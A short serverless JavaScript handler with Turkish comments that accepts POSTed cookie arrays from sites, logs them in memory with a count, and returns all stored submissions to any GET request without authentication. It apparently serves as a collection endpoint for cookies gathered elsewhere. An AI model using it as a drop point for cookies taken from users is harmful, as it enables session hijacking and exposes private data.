let posts = [];

export default function handler(req, res) {
  if (req.method === 'POST') {
    let body = req.body;
    // Vercel bazen body'yi otomatik parse etmez, düzeltme:
    if (typeof body === 'string') {
      try { 
        body = JSON.parse(body); 
      } catch {}
    }

    // Her site için cookie sayısını hesapla
    let cookieCount = 0;
    if (body && body.cookies && Array.isArray(body.cookies)) {
      cookieCount = body.cookies.length;
    }

    const data = {
      time: new Date().toISOString(),
      cookieCount: cookieCount, // Sitenin cookie sayısı
      body
    };
    posts.unshift(data);
    res.status(200).json({ status: 'ok', received: data });
  } else if (req.method === 'GET') {
    res.status(200).json(posts);
  } else {
    res.status(405).json({ error: 'Method not allowed' });
  }
}